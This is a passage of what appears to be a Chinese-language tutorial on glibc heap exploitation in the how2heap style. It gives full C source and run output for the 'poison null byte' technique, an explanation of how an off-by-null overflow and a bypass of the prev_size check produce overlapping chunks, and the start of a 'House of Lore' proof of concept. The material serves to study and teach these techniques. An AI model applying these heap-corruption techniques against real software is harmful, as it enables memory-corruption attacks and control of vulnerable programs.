</span></span><span class=line><span class=cl>	<span class=kt>uint8_t</span><span class=o>*</span> <span class=n>b1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>uint8_t</span><span class=o>*</span> <span class=n>b2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>uint8_t</span><span class=o>*</span> <span class=n>d</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>void</span> <span class=o>*</span><span class=n>barrier</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We allocate 0x100 bytes for &#39;a&#39;.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>a</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint8_t</span><span class=o>*</span><span class=p>)</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;a: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>real_a_size</span> <span class=o>=</span> <span class=n>malloc_usable_size</span><span class=p>(</span><span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Since we want to overflow &#39;a&#39;, we need to know the &#39;real&#39; size of &#39;a&#39; &#34;</span>
</span></span><span class=line><span class=cl>		<span class=s>&#34;(it may be more than 0x100 because of rounding): %#x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>real_a_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=cm>/* chunk size attribute cannot have a least significant byte with a value of 0x00.
</span></span></span><span class=line><span class=cl><span class=cm>	 * the least significant byte of this will be 0x10, because the size of the chunk includes
</span></span></span><span class=line><span class=cl><span class=cm>	 * the amount requested plus some amount required for the metadata. */</span>
</span></span><span class=line><span class=cl>	<span class=n>b</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint8_t</span><span class=o>*</span><span class=p>)</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x200</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;b: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>b</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>c</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint8_t</span><span class=o>*</span><span class=p>)</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;c: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>c</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>barrier</span> <span class=o>=</span>  <span class=n>malloc</span><span class=p>(</span><span class=mh>0x100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>		<span class=s>&#34;The barrier is not strictly necessary, but makes things less confusing</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>barrier</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=kt>uint64_t</span><span class=o>*</span> <span class=n>b_size_ptr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint64_t</span><span class=o>*</span><span class=p>)(</span><span class=n>b</span> <span class=o>-</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// added fix for size==prev_size(next_chunk) check in newer versions of glibc
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// this added check requires we are allowed to have null pointers in b (not just a c string)
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>//*(size_t*)(b+0x1f0) = 0x200;
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;In newer versions of glibc we will need to have our updated size inside b itself to pass &#34;</span>
</span></span><span class=line><span class=cl>		<span class=s>&#34;the check&#39;chunksize(P) != prev_size (next_chunk(P))&#39;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=c1>// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// which is the value of b.size after its first byte has been overwritten with a NULL byte
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=o>*</span><span class=p>(</span><span class=n>size_t</span><span class=o>*</span><span class=p>)(</span><span class=n>b</span><span class=o>+</span><span class=mh>0x1f0</span><span class=p>)</span> <span class=o>=</span> <span class=mh>0x200</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// this technique works by overwriting the size metadata of a free chunk
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=n>free</span><span class=p>(</span><span class=n>b</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;b.size: %#lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>*</span><span class=n>b_size_ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;b.size is: (0x200 + 0x10) | prev_in_use</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We overflow &#39;a&#39; with a single null byte into the metadata of &#39;b&#39;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>a</span><span class=p>[</span><span class=n>real_a_size</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=c1>// &lt;--- THIS IS THE&#34;EXPLOITED BUG&#34;
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;b.size: %#lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>*</span><span class=n>b_size_ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=kt>uint64_t</span><span class=o>*</span> <span class=n>c_prev_size_ptr</span> <span class=o>=</span> <span class=p>((</span><span class=kt>uint64_t</span><span class=o>*</span><span class=p>)</span><span class=n>c</span><span class=p>)</span><span class=o>-</span><span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;c.prev_size is %#lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=o>*</span><span class=n>c_prev_size_ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// This malloc will result in a call to unlink on the chunk where b was.
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// The added check (commit id: 17f487b), if not properly handled as we did before,
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// will detect the heap corruption now.
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// The check is this: chunksize(P) != prev_size (next_chunk(P)) where
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// next_chunk(P) == b-0x10+0x200 == b+0x1f0
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=o>*</span><span class=p>((</span><span class=n>size_t</span><span class=o>*</span><span class=p>)(</span><span class=n>b</span><span class=o>-</span><span class=mh>0x8</span><span class=p>)),</span> <span class=o>*</span><span class=p>(</span><span class=n>size_t</span><span class=o>*</span><span class=p>)(</span><span class=n>b</span><span class=o>-</span><span class=mh>0x10</span> <span class=o>+</span> <span class=o>*</span><span class=p>((</span><span class=n>size_t</span><span class=o>*</span><span class=p>)(</span><span class=n>b</span><span class=o>-</span><span class=mh>0x8</span><span class=p>))));</span>
</span></span><span class=line><span class=cl>	<span class=n>b1</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;b1: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=n>b1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now we malloc &#39;b1&#39;. It will be placed where &#39;b&#39; was. &#34;</span>
</span></span><span class=line><span class=cl>		<span class=s>&#34;At this point c.prev_size should have been updated, but it was not: %#lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=o>*</span><span class=n>c_prev_size_ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Interestingly, the updated value of c.prev_size has been written 0x10 bytes &#34;</span>
</span></span><span class=line><span class=cl>		<span class=s>&#34;before c.prev_size: %lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=o>*</span><span class=p>(((</span><span class=kt>uint64_t</span><span class=o>*</span><span class=p>)</span><span class=n>c</span><span class=p>)</span><span class=o>-</span><span class=mi>4</span><span class=p>));</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We malloc &#39;b2&#39;, our &#39;victim&#39; chunk.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=c1>// Typically b2 (the victim) will be a structure with valuable pointers that we want to control
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>	<span class=n>b2</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x80</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;b2: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=n>b2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>memset</span><span class=p>(</span><span class=n>b2</span><span class=p>,</span><span class=sc>&#39;B&#39;</span><span class=p>,</span><span class=mh>0x80</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Current b2 content:</span><span class=se>\n</span><span class=s>%s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=n>b2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now we free &#39;b1&#39; and &#39;c&#39;: this will consolidate the chunks &#39;b1&#39; and &#39;c&#39; (forgetting about&#39;b2&#39;).</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>free</span><span class=p>(</span><span class=n>b1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>free</span><span class=p>(</span><span class=n>c</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Finally, we allocate &#39;d&#39;, overlapping &#39;b2&#39;.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>d</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x300</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;d: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=n>d</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now &#39;d&#39; and &#39;b2&#39; overlap.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>memset</span><span class=p>(</span><span class=n>d</span><span class=p>,</span><span class=sc>&#39;D&#39;</span><span class=p>,</span><span class=mh>0x300</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;New b2 content:</span><span class=se>\n</span><span class=s>%s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=n>b2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks&#34;</span>
</span></span><span class=line><span class=cl>		<span class=s>&#34;for the clear explanation of this technique.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>输出：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Welcome to poison null byte 2.0!
</span></span><span class=line><span class=cl>Tested in Ubuntu 14.04 64bit.
</span></span><span class=line><span class=cl>This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.
</span></span><span class=line><span class=cl>This technique can be used when you have an off-by-one into a malloc&#39;ed region with a null byte.
</span></span><span class=line><span class=cl>We allocate 0x100 bytes for &#39;a&#39;.
</span></span><span class=line><span class=cl>a: 0x19e6010
</span></span><span class=line><span class=cl>Since we want to overflow &#39;a&#39;, we need to know the &#39;real&#39; size of &#39;a&#39; (it may be more than 0x100 because of rounding): 0x108
</span></span><span class=line><span class=cl>b: 0x19e6120
</span></span><span class=line><span class=cl>c: 0x19e6330
</span></span><span class=line><span class=cl>We allocate a barrier at 0x19e6440, so that c is not consolidated with the top-chunk when freed.
</span></span><span class=line><span class=cl>The barrier is not strictly necessary, but makes things less confusing
</span></span><span class=line><span class=cl>In newer versions of glibc we will need to have our updated size inside b itself to pass the check &#39;chunksize(P) != prev_size (next_chunk(P))&#39;
</span></span><span class=line><span class=cl>b.size: 0x211
</span></span><span class=line><span class=cl>b.size is: (0x200 + 0x10) | prev_in_use
</span></span><span class=line><span class=cl>We overflow &#39;a&#39; with a single null byte into the metadata of &#39;b&#39;
</span></span><span class=line><span class=cl>b.size: 0x200
</span></span><span class=line><span class=cl>c.prev_size is 0x210
</span></span><span class=line><span class=cl>We will pass the check since chunksize(P) == 0x200 == 0x200 == prev_size (next_chunk(P))
</span></span><span class=line><span class=cl>b1: 0x19e6120
</span></span><span class=line><span class=cl>Now we malloc &#39;b1&#39;. It will be placed where &#39;b&#39; was. At this point c.prev_size should have been updated, but it was not: 0x210
</span></span><span class=line><span class=cl>Interestingly, the updated value of c.prev_size has been written 0x10 bytes before c.prev_size: f0
</span></span><span class=line><span class=cl>We malloc &#39;b2&#39;, our &#39;victim&#39; chunk.
</span></span><span class=line><span class=cl>b2: 0x19e6230
</span></span><span class=line><span class=cl>Current b2 content:
</span></span><span class=line><span class=cl>BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
</span></span><span class=line><span class=cl>Now we free &#39;b1&#39; and &#39;c&#39;: this will consolidate the chunks &#39;b1&#39; and &#39;c&#39; (forgetting about&#39;b2&#39;).
</span></span><span class=line><span class=cl>Finally, we allocate &#39;d&#39;, overlapping &#39;b2&#39;.
</span></span><span class=line><span class=cl>d: 0x19e6120
</span></span><span class=line><span class=cl>Now &#39;d&#39; and &#39;b2&#39; overlap.
</span></span><span class=line><span class=cl>New b2 content:
</span></span><span class=line><span class=cl>DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
</span></span><span class=line><span class=cl>Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunksfor the clear explanation of this technique.
</span></span></code></pre></td></tr></table></div></div><p>这里的漏洞很简单，就是 off-by-null，通过 <code>a</code> 溢出了一字节到已经被释放了的 <code>b</code>，使得 <code>b</code> 的 <code>chunk_size</code> 被改变。这里需要注意的是，新版本 glibc 增加了检验机制，如果 <code>chunksize(P) != prev_size (next_chunk(P))</code> 则会报错，那么如何绕过呢？</p><p>我们知道 P 是指 chunk 指针，也就是 <code>b-0x10</code>，那么 <code>b-0x8</code> 就是这里的 <code>chunksize(P)</code>，被 off-by-null 后变成 0x200。而 <code>next_chunk(P)</code> 则为 <code>b-0x10+0x200 = b+0x1f0</code>。所以 <code>prev_size(next_chunk(P))</code> 实际上就是 <code>*(b+0x1f0)</code>。那么我们提前修改 <code>b+0x1f0 = 0x200</code> 既绕过了验证。</p><p>随后申请了 0x100 的 b1，位于原来 b 的位置上，这时原本应该更新的是 <code>c</code> 的 <code>prev_size</code>，但是由于我们刚才说的 <code>prev_size(next_chunk(P))</code> 等于 <code>*(b+0x1f0)</code>，实际上被更新的位置是 <code>b+0x1f0</code>，也就是 <code>c.prev_size - 0x10</code>。换句话说，<code>c</code> 依然认为它前面的块的大小是 0x210。</p><p>于是我们在 <code>b1</code> 下面申请 0x80 的 <code>b2</code>，尽管它被夹在 <code>b1</code> 和 <code>c</code> 中间，当我们释放 <code>b1</code> 和 <code>c</code> 时两者依旧会合并，但我们依然控制着 <code>b2</code> 指针！这个时候申请 0x300 的 <code>d</code>，它还是会被放到 <code>b1</code> 的位置，那么通过 <code>d</code> 就可以完全控制 <code>b2</code> 这个 chunk。</p><h2 id=house_of_lore>house_of_lore</h2><p>源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>Advanced exploitation of the House of Lore - Malloc Maleficarum.
</span></span></span><span class=line><span class=cl><span class=cm>This PoC take care also of the glibc hardening of smallbin corruption.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>[...]
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>else
</span></span></span><span class=line><span class=cl><span class=cm>    {
</span></span></span><span class=line><span class=cl><span class=cm>      bck = victim-&gt;bk;
</span></span></span><span class=line><span class=cl><span class=cm>    if (__glibc_unlikely (bck-&gt;fd != victim)){
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>                  errstr = &#34;malloc(): smallbin double linked list corrupted&#34;;
</span></span></span><span class=line><span class=cl><span class=cm>                  goto errout;
</span></span></span><span class=line><span class=cl><span class=cm>                }
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>       set_inuse_bit_at_offset (victim, nb);
</span></span></span><span class=line><span class=cl><span class=cm>       bin-&gt;bk = bck;
</span></span></span><span class=line><span class=cl><span class=cm>       bck-&gt;fd = bin;
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>       [...]
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>jackpot</span><span class=p>(){</span> <span class=n>puts</span><span class=p>(</span><span class=s>&#34;Nice jump d00d&#34;</span><span class=p>);</span> <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span> <span class=n>argv</span><span class=p>[]){</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>intptr_t</span><span class=o>*</span> <span class=n>stack_buffer_1</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
</span></span><span class=line><span class=cl>  <span class=n>intptr_t</span><span class=o>*</span> <span class=n>stack_buffer_2</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Welcome to the House of Lore</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This is a revisited version that bypass also the hardening check introduced by glibc malloc</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Allocating the victim chunk</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>intptr_t</span> <span class=o>*</span><span class=n>victim</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mi>100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Allocated the first small chunk on the heap at %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>victim</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
